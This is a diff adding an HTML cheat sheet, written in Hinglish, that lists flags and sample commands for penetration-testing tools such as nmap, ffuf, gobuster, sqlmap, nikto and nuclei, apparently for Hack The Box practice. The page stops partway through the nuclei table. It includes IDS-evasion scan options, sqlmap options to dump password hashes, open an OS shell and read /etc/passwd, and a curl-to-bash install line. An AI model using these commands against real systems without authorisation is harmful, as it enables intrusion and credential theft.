@@ -1,0 +1,1674 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tools Flags Bible — Complete</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{background:#0d1117;color:#e6edf3;font-family:'Courier New',monospace;font-size:12px;padding:10px;overflow-y:auto;-webkit-overflow-scrolling:touch}
+h1{font-size:16px;color:#00ff88;padding:10px 0 4px;font-family:Arial,sans-serif;letter-spacing:1px}
+h1 span{color:#555;font-size:11px;font-family:'Courier New',monospace;margin-left:8px}
+.tabs{display:flex;gap:4px;flex-wrap:wrap;margin:10px 0 14px;position:sticky;top:0;background:#0d1117;padding:6px 0;z-index:99;border-bottom:1px solid #21262d}
+.tab{padding:5px 11px;border:1px solid #30363d;border-radius:4px;background:#161b22;cursor:pointer;font-size:11px;font-weight:700;color:#8b949e;font-family:Arial,sans-serif}
+.tab.on{background:#00ff8822;border-color:#00ff88;color:#00ff88}
+.sheet{display:none}.sheet.on{display:block}
+/* TOOL BLOCK */
+.tool{background:#161b22;border:1px solid #21262d;border-radius:8px;margin-bottom:14px;overflow:visible}
+.tool-title{background:#1c2128;padding:8px 12px;border-bottom:1px solid #21262d;display:flex;align-items:center;gap:8px}
+.tool-title h2{font-size:13px;font-weight:900;color:#e6edf3;font-family:Arial,sans-serif}
+.tool-title .port{color:#58a6ff;font-size:10px;margin-left:auto}
+.tool-desc{color:#7ee787;font-size:11px;padding:7px 12px;border-bottom:1px solid #21262d;line-height:1.6;font-family:Arial,sans-serif}
+.install{color:#8b949e;font-size:10px;padding:4px 12px;border-bottom:1px solid #21262d}
+.install b{color:#f9e2af}
+/* FLAGS TABLE */
+table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch}
+th{background:#0d1117;color:#58a6ff;padding:5px 10px;text-align:left;font-size:10px;letter-spacing:.5px;text-transform:uppercase;border-bottom:1px solid #21262d}
+td{padding:5px 10px;border-bottom:1px solid #161b22;vertical-align:top;font-size:11px}
+tr:nth-child(even) td{background:#0d1117}
+td:first-child{color:#ffa657;white-space:nowrap;min-width:160px}
+td:nth-child(2){color:#a5d6ff;min-width:80px}
+td:last-child{color:#8b949e;font-family:Arial,sans-serif;line-height:1.6}
+/* EXAMPLES */
+.ex-block{padding:8px 12px;border-top:1px solid #21262d}
+.ex-label{color:#555;font-size:9px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
+.ex{background:#0d1117;border-left:3px solid #00ff88;padding:6px 10px;margin:4px 0;color:#7ee787;font-size:11px;line-height:1.8;overflow-x:auto;-webkit-overflow-scrolling:touch;white-space:pre}
+.ex .c{color:#484f58}
+.ex .f{color:#79c0ff}
+.ex .a{color:#ffa657}
+/* CATEGORIES */
+.cat{display:inline-block;padding:1px 7px;border-radius:10px;font-size:9px;font-weight:700;margin-left:6px}
+.c-r{background:#3d1a1a;color:#f85149}.c-y{background:#2d2208;color:#d29922}.c-g{background:#0d2818;color:#3fb950}.c-b{background:#0c1e3a;color:#58a6ff}.c-p{background:#1f1035;color:#bc8cff}
+.note{background:#2d2208;border:1px solid #d2992244;border-radius:6px;padding:7px 10px;margin:8px 12px;font-size:11px;color:#d29922;font-family:Arial,sans-serif;line-height:1.7}
+</style>
+</head>
+<body>
+
+<h1>💀 TOOLS FLAGS BIBLE <span>— Har Tool Ka Har Flag | Karan's Complete Reference</span></h1>
+
+<div class="tabs">
+  <button class="tab on" onclick="show('recon',this)">🗺️ nmap</button>
+  <button class="tab" onclick="show('web',this)">🌐 Web Fuzz</button>
+  <button class="tab" onclick="show('vuln',this)">💉 Vuln Scan</button>
+  <button class="tab" onclick="show('brute',this)">🔨 Brute Force</button>
+  <button class="tab" onclick="show('hash',this)">🔑 Hash</button>
+  <button class="tab" onclick="show('exploit',this)">💣 MSF</button>
+  <button class="tab" onclick="show('smb',this)">📁 SMB/Win</button>
+  <button class="tab" onclick="show('shells',this)">🐚 Shells/NC</button>
+  <button class="tab" onclick="show('impacket',this)">🪟 Impacket</button>
+  <button class="tab" onclick="show('privesc',this)">📈 Priv Esc</button>
+  <button class="tab" onclick="show('crypto',this)">🔒 Crypto</button>
+  <button class="tab" onclick="show('misc',this)">🧰 Misc</button>
+  <button class="tab" onclick="show('ports',this)">🔌 Ports Guide</button>
+</div>
+
+<!-- ═══ NMAP ═══ -->
+<div class="sheet on" id="s-recon">
+
+<div class="tool">
+<div class="tool-title"><h2>🔍 NMAP</h2><span class="cat c-r">Recon</span><span class="port">Network Mapper</span></div>
+<div class="tool-desc">Port scanning, service version detection, OS detection, vulnerability scripts. HTB mein sabse pehla tool!</div>
+<div class="install"><b>Kali mein pre-installed</b> | sudo apt install nmap</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<!-- SCAN TYPES -->
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── SCAN TYPES ──</td></tr>
+<tr><td>-sS</td><td>Stealth</td><td>SYN scan (default root) — half-open, fast, less detected</td></tr>
+<tr><td>-sT</td><td>Connect</td><td>Full TCP connect — no root needed, slower, logged</td></tr>
+<tr><td>-sU</td><td>UDP</td><td>UDP ports scan — DNS(53), SNMP(161), slow hai</td></tr>
+<tr><td>-sV</td><td>Version</td><td>Service version detect — Apache 2.4.18, OpenSSH 7.4</td></tr>
+<tr><td>-sC</td><td>Scripts</td><td>Default NSE scripts run karo — basic enumeration</td></tr>
+<tr><td>-sA</td><td>ACK</td><td>Firewall rules map karo</td></tr>
+<tr><td>-sN</td><td>Null</td><td>No flags — firewall bypass karo</td></tr>
+<tr><td>-sF</td><td>FIN</td><td>FIN flag only — firewall bypass</td></tr>
+<tr><td>-sX</td><td>Xmas</td><td>FIN+PSH+URG — firewall bypass</td></tr>
+<tr><td>-sP / -sn</td><td>Ping</td><td>Host discovery only — port scan nahi</td></tr>
+<tr><td>-O</td><td>OS</td><td>OS detection — Windows/Linux/BSD</td></tr>
+<tr><td>-A</td><td>Aggressive</td><td>-sV -sC -O traceroute sab — noisy!</td></tr>
+<!-- PORT SELECTION -->
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── PORT SELECTION ──</td></tr>
+<tr><td>-p 80</td><td>Port</td><td>Sirf port 80</td></tr>
+<tr><td>-p 80,443,22</td><td>Port list</td><td>Multiple ports</td></tr>
+<tr><td>-p 1-1000</td><td>Port range</td><td>1 se 1000 tak</td></tr>
+<tr><td>-p-</td><td>All ports</td><td>Sab 65535 ports — dhheema lekin thorough</td></tr>
+<tr><td>-p U:53,T:80</td><td>Protocol</td><td>UDP 53 aur TCP 80</td></tr>
+<tr><td>--top-ports 100</td><td>Top</td><td>Sabse common 100 ports</td></tr>
+<!-- TIMING -->
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── TIMING & SPEED ──</td></tr>
+<tr><td>-T0</td><td>Paranoid</td><td>Bahut slow — IDS evasion</td></tr>
+<tr><td>-T1</td><td>Sneaky</td><td>Slow</td></tr>
+<tr><td>-T2</td><td>Polite</td><td>Thoda slow</td></tr>
+<tr><td>-T3</td><td>Normal</td><td>Default</td></tr>
+<tr><td>-T4</td><td>Aggressive</td><td>Fast — HTB mein ye use karo</td></tr>
+<tr><td>-T5</td><td>Insane</td><td>Ultra fast — unstable ho sakta hai</td></tr>
+<tr><td>--min-rate 5000</td><td>Rate</td><td>Min 5000 packets/sec bhejo</td></tr>
+<tr><td>--max-rate 1000</td><td>Rate</td><td>Max 1000 packets/sec</td></tr>
+<tr><td>--min-parallelism 100</td><td>Parallel</td><td>Min 100 parallel probes</td></tr>
+<!-- OUTPUT -->
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── OUTPUT ──</td></tr>
+<tr><td>-oN file.txt</td><td>Normal</td><td>Human readable output save karo</td></tr>
+<tr><td>-oX file.xml</td><td>XML</td><td>XML format — tools import kar sakte hain</td></tr>
+<tr><td>-oG file.grep</td><td>Grepable</td><td>grep se search karne ke liye</td></tr>
+<tr><td>-oA basename</td><td>All</td><td>Teeno formats ek saath</td></tr>
+<tr><td>-v</td><td>Verbose</td><td>Zyada output dikhao</td></tr>
+<tr><td>-vv</td><td>Very verbose</td><td>Aur zyada output</td></tr>
+<tr><td>--reason</td><td>Reason</td><td>Port open/closed kyun hai batao</td></tr>
+<tr><td>--open</td><td>Filter</td><td>Sirf open ports dikhao</td></tr>
+<!-- EVASION -->
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── FIREWALL/IDS EVASION ──</td></tr>
+<tr><td>-Pn</td><td>Skip ping</td><td>Ping skip karo — firewall se peeche targets ke liye</td></tr>
+<tr><td>-f</td><td>Fragment</td><td>Packets fragment karo — firewall bypass</td></tr>
+<tr><td>-D RND:10</td><td>Decoy</td><td>10 random decoy IPs se scan karo</td></tr>
+<tr><td>-S SPOOFED_IP</td><td>Spoof</td><td>Source IP spoof karo (limited use)</td></tr>
+<tr><td>--source-port 53</td><td>SrcPort</td><td>Port 53 se bhejo — firewall often allow karta hai</td></tr>
+<tr><td>--data-length 25</td><td>Padding</td><td>Random data add karo packets mein</td></tr>
+<!-- NSE SCRIPTS -->
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── NSE SCRIPTS ──</td></tr>
+<tr><td>-sC</td><td>Default</td><td>Default scripts</td></tr>
+<tr><td>--script vuln</td><td>Vuln</td><td>Vulnerability check karo</td></tr>
+<tr><td>--script smb-vuln*</td><td>SMB</td><td>SMB vulnerabilities — EternalBlue etc.</td></tr>
+<tr><td>--script http-enum</td><td>HTTP</td><td>HTTP directories enumerate karo</td></tr>
+<tr><td>--script ftp-anon</td><td>FTP</td><td>FTP anonymous login check karo</td></tr>
+<tr><td>--script ssh-brute</td><td>SSH</td><td>SSH brute force</td></tr>
+<tr><td>--script dns-brute</td><td>DNS</td><td>DNS subdomain brute force</td></tr>
+<tr><td>--script=banner</td><td>Banner</td><td>Service banners grab karo</td></tr>
+<tr><td>--script-args user=admin</td><td>Args</td><td>Script ko arguments do</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ HTB Essential Commands</div>
+<div class="ex"><span class="c"># Step 1: Fast all ports</span>
+nmap <span class="f">-p-</span> <span class="a">TARGET_IP</span> <span class="f">--min-rate 5000 -oN</span> allports.txt</div>
+<div class="ex"><span class="c"># Step 2: Deep scan on open ports</span>
+nmap <span class="f">-sC -sV -p</span> <span class="a">22,80,445</span> TARGET_IP <span class="f">-oN</span> targeted.txt</div>
+<div class="ex"><span class="c"># Step 3: UDP scan (slow)</span>
+nmap <span class="f">-sU -p</span> <span class="a">53,161,162,500</span> TARGET_IP</div>
+<div class="ex"><span class="c"># Vulnerability scan</span>
+nmap <span class="f">--script vuln -p</span> <span class="a">80,443</span> TARGET_IP</div>
+<div class="ex"><span class="c"># Subnet discovery</span>
+nmap <span class="f">-sn</span> <span class="a">192.168.1.0/24</span></div>
+</div>
+</div>
+
+</div><!-- recon -->
+
+<!-- ═══ WEB FUZZING ═══ -->
+<div class="sheet" id="s-web">
+
+<div class="tool">
+<div class="tool-title"><h2>🔍 FFUF — Fast Web Fuzzer</h2><span class="cat c-y">Web</span></div>
+<div class="tool-desc">Fastest web fuzzer — directories, parameters, subdomains, VHOSTs, POST data sab fuzz karo</div>
+<div class="install"><b>Install:</b> sudo apt install ffuf  |  go install github.com/ffuf/ffuf/v2@latest</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── INPUT ──</td></tr>
+<tr><td>-u URL</td><td>URL</td><td>Target URL — FUZZ keyword jahan fuzz karna hai</td></tr>
+<tr><td>-w wordlist</td><td>Wordlist</td><td>Wordlist file path</td></tr>
+<tr><td>-w list1:W1 -w list2:W2</td><td>Multi</td><td>Multiple wordlists — W1, W2 keywords se</td></tr>
+<tr><td>FUZZ</td><td>Keyword</td><td>Yahan wordlist ka word aayega — URL mein use karo</td></tr>
+<tr><td>-request file</td><td>Request</td><td>Raw HTTP request file se</td></tr>
+<tr><td>-request-proto http</td><td>Proto</td><td>Request file ka protocol</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── HTTP ──</td></tr>
+<tr><td>-X POST</td><td>Method</td><td>HTTP method — GET/POST/PUT/DELETE</td></tr>
+<tr><td>-d "data"</td><td>Data</td><td>POST body data</td></tr>
+<tr><td>-H "Header: val"</td><td>Header</td><td>Custom header add karo</td></tr>
+<tr><td>-b "cookie"</td><td>Cookie</td><td>Cookie set karo</td></tr>
+<tr><td>-recursion</td><td>Recurse</td><td>Found directories recursively fuzz karo</td></tr>
+<tr><td>-recursion-depth 2</td><td>Depth</td><td>Recursion ki depth</td></tr>
+<tr><td>-follow-redirects</td><td>Redirect</td><td>Redirects follow karo</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── FILTER / MATCH ──</td></tr>
+<tr><td>-fc 404</td><td>Filter</td><td>Status code 404 wale hide karo (filter code)</td></tr>
+<tr><td>-fc 404,403,500</td><td>Filter</td><td>Multiple codes filter</td></tr>
+<tr><td>-mc 200,301</td><td>Match</td><td>Sirf ye status codes dikhao (match code)</td></tr>
+<tr><td>-fs 1234</td><td>Filter</td><td>Response size 1234 bytes wale filter karo</td></tr>
+<tr><td>-ms 500</td><td>Match</td><td>Sirf 500 byte response dikhao</td></tr>
+<tr><td>-fw 10</td><td>Filter</td><td>10 words wale responses filter karo</td></tr>
+<tr><td>-mw 50</td><td>Match</td><td>50 words wale match karo</td></tr>
+<tr><td>-fl 5</td><td>Filter</td><td>5 lines wale responses filter karo</td></tr>
+<tr><td>-ml 20</td><td>Match</td><td>20 lines wale match karo</td></tr>
+<tr><td>-mr "regex"</td><td>Match</td><td>Response mein regex match karo</td></tr>
+<tr><td>-fr "regex"</td><td>Filter</td><td>Response mein regex filter karo</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── OUTPUT & SPEED ──</td></tr>
+<tr><td>-t 100</td><td>Threads</td><td>Parallel threads (default 40)</td></tr>
+<tr><td>-rate 500</td><td>Rate</td><td>Requests per second limit</td></tr>
+<tr><td>-o output.json</td><td>Output</td><td>Results save karo</td></tr>
+<tr><td>-of json</td><td>Format</td><td>Output format — json/html/md/csv</td></tr>
+<tr><td>-s</td><td>Silent</td><td>Silent mode — sirf results</td></tr>
+<tr><td>-v</td><td>Verbose</td><td>Verbose — full URL dikhao</td></tr>
+<tr><td>-e .php,.html</td><td>Ext</td><td>Extensions try karo</td></tr>
+<tr><td>-ic</td><td>Ignore</td><td>Wordlist comments ignore karo</td></tr>
+<tr><td>-timeout 10</td><td>Timeout</td><td>Request timeout seconds</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Common Commands</div>
+<div class="ex">ffuf <span class="f">-u</span> http://TARGET/FUZZ <span class="f">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="f">-fc</span> <span class="a">404</span></div>
+<div class="ex">ffuf <span class="f">-u</span> http://TARGET/FUZZ <span class="f">-w</span> wordlist.txt <span class="f">-e</span> <span class="a">.php,.html,.txt,.bak,.zip</span></div>
+<div class="ex"><span class="c"># Subdomain/VHOST fuzzing</span>
+ffuf <span class="f">-u</span> http://TARGET/ <span class="f">-H</span> <span class="a">"Host: FUZZ.target.htb"</span> <span class="f">-w</span> subdomains.txt <span class="f">-fs</span> <span class="a">BASELINE_SIZE</span></div>
+<div class="ex"><span class="c"># POST form fuzzing</span>
+ffuf <span class="f">-u</span> http://TARGET/login <span class="f">-X POST -d</span> <span class="a">"user=FUZZ&pass=admin123"</span> <span class="f">-w</span> users.txt <span class="f">-fc</span> <span class="a">200</span></div>
+<div class="ex"><span class="c"># Parameter fuzzing</span>
+ffuf <span class="f">-u</span> "http://TARGET/page?FUZZ=value" <span class="f">-w</span> params.txt</div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🔍 GOBUSTER</h2><span class="cat c-y">Web</span></div>
+<div class="tool-desc">Directory, DNS, VHOST, S3 bucket bruteforce — Go se likha, fast hai</div>
+<div class="install"><b>Install:</b> sudo apt install gobuster  |  go install github.com/OJ/gobuster/v3@latest</div>
+<table>
+<tr><th>Flag</th><th>Mode</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── MODES ──</td></tr>
+<tr><td>dir</td><td>Mode</td><td>Directory/file bruteforce — sabse common</td></tr>
+<tr><td>dns</td><td>Mode</td><td>DNS subdomain bruteforce</td></tr>
+<tr><td>vhost</td><td>Mode</td><td>Virtual host discovery</td></tr>
+<tr><td>s3</td><td>Mode</td><td>AWS S3 bucket discovery</td></tr>
+<tr><td>fuzz</td><td>Mode</td><td>Generic fuzzing</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── COMMON FLAGS (all modes) ──</td></tr>
+<tr><td>-u URL</td><td>Target</td><td>Target URL</td></tr>
+<tr><td>-w wordlist</td><td>Wordlist</td><td>Wordlist file</td></tr>
+<tr><td>-t 50</td><td>Threads</td><td>Concurrent threads (default 10)</td></tr>
+<tr><td>-o output.txt</td><td>Output</td><td>Output file</td></tr>
+<tr><td>-q</td><td>Quiet</td><td>Progress hide karo</td></tr>
+<tr><td>-v</td><td>Verbose</td><td>Verbose output</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── DIR MODE FLAGS ──</td></tr>
+<tr><td>-x php,html,txt</td><td>Ext</td><td>Extensions try karo</td></tr>
+<tr><td>-s 200,301,302</td><td>Status</td><td>Ye status codes show karo</td></tr>
+<tr><td>-b 404,403</td><td>Blacklist</td><td>Ye status codes hide karo</td></tr>
+<tr><td>-r</td><td>Redirect</td><td>Redirects follow karo</td></tr>
+<tr><td>-l</td><td>Length</td><td>Response length show karo</td></tr>
+<tr><td>-e</td><td>Expanded</td><td>Full URL show karo</td></tr>
+<tr><td>-k</td><td>SSL</td><td>SSL certificate verify mat karo</td></tr>
+<tr><td>-a "UA string"</td><td>UserAgent</td><td>Custom User-Agent</td></tr>
+<tr><td>-H "Header: val"</td><td>Header</td><td>Custom header</td></tr>
+<tr><td>-c "cookie"</td><td>Cookie</td><td>Cookie set karo</td></tr>
+<tr><td>-U user -P pass</td><td>Auth</td><td>Basic authentication</td></tr>
+<tr><td>--timeout 10s</td><td>Timeout</td><td>Request timeout</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── DNS MODE FLAGS ──</td></tr>
+<tr><td>-d domain.com</td><td>Domain</td><td>Target domain</td></tr>
+<tr><td>-r 8.8.8.8</td><td>Resolver</td><td>Custom DNS resolver</td></tr>
+<tr><td>-i</td><td>IP</td><td>IP addresses bhi show karo</td></tr>
+<tr><td>-c</td><td>CNAME</td><td>CNAME entries show karo</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Common Commands</div>
+<div class="ex">gobuster dir <span class="f">-u</span> http://TARGET <span class="f">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="f">-x</span> <span class="a">php,html,txt</span> <span class="f">-t</span> <span class="a">50</span></div>
+<div class="ex">gobuster dns <span class="f">-d</span> <span class="a">target.com</span> <span class="f">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="f">-i</span></div>
+<div class="ex">gobuster vhost <span class="f">-u</span> http://TARGET <span class="f">-w</span> subdomains.txt <span class="f">-t</span> <span class="a">50</span></div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🚀 FEROXBUSTER</h2><span class="cat c-y">Web</span></div>
+<div class="tool-desc">Gobuster se fast — Rust mein likha! Recursive auto-scanning, auto-tune</div>
+<div class="install"><b>Install:</b> sudo apt install feroxbuster  |  curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-u URL</td><td>Target</td><td>Target URL</td></tr>
+<tr><td>-w wordlist</td><td>Wordlist</td><td>Wordlist</td></tr>
+<tr><td>-x php,html</td><td>Ext</td><td>Extensions</td></tr>
+<tr><td>-t 100</td><td>Threads</td><td>Threads</td></tr>
+<tr><td>-r</td><td>Recurse</td><td>Auto recursive scan</td></tr>
+<tr><td>-d 3</td><td>Depth</td><td>Recursion depth limit</td></tr>
+<tr><td>--filter-status 404,403</td><td>Filter</td><td>Status codes filter</td></tr>
+<tr><td>--filter-size 1234</td><td>Filter</td><td>Size filter</td></tr>
+<tr><td>-H "Cookie: x=y"</td><td>Header</td><td>Custom header</td></tr>
+<tr><td>-o output.txt</td><td>Output</td><td>Output file</td></tr>
+<tr><td>--resume-from state</td><td>Resume</td><td>Interrupted scan resume karo</td></tr>
+<tr><td>-k</td><td>SSL</td><td>SSL ignore karo</td></tr>
+<tr><td>--auto-tune</td><td>Auto</td><td>Speed auto-adjust karo</td></tr>
+<tr><td>--json</td><td>JSON</td><td>JSON output</td></tr>
+<tr><td>-s 200,301</td><td>Status</td><td>Sirf ye status dikhao</td></tr>
+<tr><td>-C "session=abc"</td><td>Cookie</td><td>Cookie</td></tr>
+<tr><td>--proxy http://127.0.0.1:8080</td><td>Proxy</td><td>Burp Suite se route karo</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🔍 ARJUN — Parameter Finder</h2><span class="cat c-y">Web</span></div>
+<div class="tool-desc">Hidden HTTP parameters dhundho — GET, POST, JSON, XML</div>
+<div class="install"><b>Install:</b> pip3 install arjun</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-u URL</td><td>Target</td><td>Target URL</td></tr>
+<tr><td>-m GET</td><td>Method</td><td>HTTP method — GET/POST/JSON/XML</td></tr>
+<tr><td>-w wordlist</td><td>Wordlist</td><td>Custom parameter wordlist</td></tr>
+<tr><td>-o output.json</td><td>Output</td><td>Results save karo</td></tr>
+<tr><td>-t 10</td><td>Threads</td><td>Threads (default 5)</td></tr>
+<tr><td>--stable</td><td>Stable</td><td>Stable mode — false positives kam</td></tr>
+<tr><td>-d 3</td><td>Delay</td><td>Delay between requests</td></tr>
+<tr><td>--headers "X: Y"</td><td>Header</td><td>Custom headers</td></tr>
+<tr><td>-c cookie</td><td>Cookie</td><td>Cookie set karo</td></tr>
+<tr><td>-i file</td><td>Input</td><td>URLs list se</td></tr>
+</table>
+</div>
+
+</div><!-- web -->
+
+<!-- ═══ VULN SCAN ═══ -->
+<div class="sheet" id="s-vuln">
+
+<div class="tool">
+<div class="tool-title"><h2>💉 SQLMAP</h2><span class="cat c-r">SQLi</span></div>
+<div class="tool-desc">Automatic SQL injection detection aur exploitation — sabse powerful SQLi tool!</div>
+<div class="install"><b>Install:</b> sudo apt install sqlmap  |  git clone https://github.com/sqlmapproject/sqlmap</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── TARGET ──</td></tr>
+<tr><td>-u "URL?id=1"</td><td>URL</td><td>GET parameter test karo</td></tr>
+<tr><td>-r request.txt</td><td>Request</td><td>Burp request file se (POST ke liye best)</td></tr>
+<tr><td>--data "user=x&id=1"</td><td>POST</td><td>POST data specify karo</td></tr>
+<tr><td>-p param</td><td>Param</td><td>Specific parameter test karo</td></tr>
+<tr><td>--cookie "session=abc"</td><td>Cookie</td><td>Cookie set karo</td></tr>
+<tr><td>--headers "X-Forwarded-For: 127.0.0.1"</td><td>Header</td><td>Custom headers</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── DETECTION ──</td></tr>
+<tr><td>--level 1-5</td><td>Level</td><td>Test ki depth (1=basic, 5=all tests) — default 1</td></tr>
+<tr><td>--risk 1-3</td><td>Risk</td><td>Risk level — 3 = data modify kar sakta hai!</td></tr>
+<tr><td>--technique BEUSTQ</td><td>Technique</td><td>B=boolean, E=error, U=union, S=stacked, T=time, Q=inline</td></tr>
+<tr><td>--dbms mysql</td><td>DBMS</td><td>Database type specify karo — mysql/mssql/oracle/sqlite</td></tr>
+<tr><td>--string "admin"</td><td>String</td><td>Valid response mein ye string hogi</td></tr>
+<tr><td>--not-string "invalid"</td><td>NotStr</td><td>Invalid response mein ye string</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── ENUMERATION ──</td></tr>
+<tr><td>--dbs</td><td>Databases</td><td>Sab databases list karo</td></tr>
+<tr><td>-D dbname --tables</td><td>Tables</td><td>Database ki tables list karo</td></tr>
+<tr><td>-D db -T table --columns</td><td>Columns</td><td>Table ke columns</td></tr>
+<tr><td>-D db -T table --dump</td><td>Dump</td><td>Table ka data dump karo</td></tr>
+<tr><td>--dump-all</td><td>All</td><td>Sab databases dump karo</td></tr>
+<tr><td>--current-db</td><td>Current</td><td>Current database naam</td></tr>
+<tr><td>--current-user</td><td>User</td><td>Current DB user</td></tr>
+<tr><td>--users</td><td>Users</td><td>Sab DB users</td></tr>
+<tr><td>--passwords</td><td>Passwords</td><td>DB users ke password hashes</td></tr>
+<tr><td>--privileges</td><td>Privs</td><td>User privileges dekho</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── OS INTERACTION ──</td></tr>
+<tr><td>--os-shell</td><td>Shell</td><td>OS command shell lo (DBA privs chahiye)</td></tr>
+<tr><td>--os-cmd "whoami"</td><td>CMD</td><td>Single OS command run karo</td></tr>
+<tr><td>--file-read "/etc/passwd"</td><td>Read</td><td>Server file padhna</td></tr>
+<tr><td>--file-write local --file-dest /tmp/</td><td>Write</td><td>Server pe file likhna</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── EVASION ──</td></tr>
+<tr><td>--tamper=space2comment</td><td>Tamper</td><td>WAF bypass tamper scripts use karo</td></tr>
+<tr><td>--random-agent</td><td>UA</td><td>Random User-Agent use karo</td></tr>
+<tr><td>--delay 2</td><td>Delay</td><td>Requests ke beech delay</td></tr>
+<tr><td>--proxy http://127.0.0.1:8080</td><td>Proxy</td><td>Burp ke through route karo</td></tr>
+<tr><td>--batch</td><td>Batch</td><td>Sab prompts ko default se answer karo</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Common Workflow</div>
+<div class="ex"><span class="c"># Basic test</span>
+sqlmap <span class="f">-u</span> "http://TARGET/item?id=1" <span class="f">--batch</span></div>
+<div class="ex"><span class="c"># From Burp request (POST best practice)</span>
+sqlmap <span class="f">-r</span> request.txt <span class="f">--batch --dbs</span></div>
+<div class="ex"><span class="c"># Dump users table</span>
+sqlmap <span class="f">-u</span> "URL?id=1" <span class="f">-D</span> <span class="a">webapp</span> <span class="f">-T</span> <span class="a">users</span> <span class="f">--dump --batch</span></div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🩺 NIKTO</h2><span class="cat c-y">Web Scanner</span></div>
+<div class="tool-desc">Web server vulnerability scanner — misconfigs, dangerous files, outdated software</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-h HOST</td><td>Target</td><td>Target host/IP</td></tr>
+<tr><td>-port 8080</td><td>Port</td><td>Custom port (default 80)</td></tr>
+<tr><td>-ssl</td><td>SSL</td><td>HTTPS use karo</td></tr>
+<tr><td>-o output.txt</td><td>Output</td><td>Output save karo</td></tr>
+<tr><td>-Format html</td><td>Format</td><td>Output format — htm/csv/xml/txt</td></tr>
+<tr><td>-Tuning 4</td><td>Tuning</td><td>1=files, 2=misconf, 4=injection, 9=SQL, x=all</td></tr>
+<tr><td>-id admin:pass</td><td>Auth</td><td>Basic auth credentials</td></tr>
+<tr><td>-useproxy</td><td>Proxy</td><td>Proxy use karo</td></tr>
+<tr><td>-timeout 10</td><td>Timeout</td><td>Connection timeout</td></tr>
+<tr><td>-Plugins ALL</td><td>Plugins</td><td>Sab plugins run karo</td></tr>
+<tr><td>-update</td><td>Update</td><td>Database update karo</td></tr>
+<tr><td>-nossl</td><td>NoSSL</td><td>SSL disable karo</td></tr>
+<tr><td>-vhost hostname</td><td>VHOST</td><td>Virtual host specify karo</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>⚡ NUCLEI</h2><span class="cat c-y">Vuln Scanner</span></div>
+<div class="tool-desc">Template-based fast vulnerability scanner — thousands of CVE checks</div>
+<div class="install"><b>Install:</b> go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-u URL</td><td>Target</td><td>Single target URL</td></tr>
+<tr><td>-l urls.txt</td><td>List</td><td>Multiple targets file se</td></tr>
+<tr><td>-t templates/</td><td>Templates</td><td>Template folder specify karo</td></tr>
+<tr><td>-t cves/</td><td>CVE</td><td>Sirf CVE templates</td></tr>
+<tr><td>-t exposures/</td><td>Exposure</td><td>Exposed panels/files</td></tr>
+<tr><td>-tags default-login</td><td>Tags</td><td>Tag se filter karo</td></tr>
+<tr><td>-severity critical,high</td><td>Severity</td><td>Sirf critical/high</td></tr>
